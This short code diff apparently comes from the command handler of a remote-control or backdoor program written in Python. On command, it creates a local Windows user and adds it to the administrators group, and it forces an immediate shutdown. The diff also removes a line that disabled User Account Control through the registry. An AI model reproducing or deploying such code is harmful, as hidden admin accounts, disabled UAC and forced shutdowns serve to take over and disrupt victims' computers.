@@ -708,7 +708,6 @@ def runCode(code):
 			pawd = fstring(o[1])
 			subprocess.run(f"net user {user} {pawd} /add".split(), check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 			subprocess.run(f"net localgroup administrators {user} /add".split(), check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-			subprocess.run(f"reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f".split(), check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		elif m == "shutdown":
 			try:
 				subprocess.run("shutdown /s /f /t 0".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
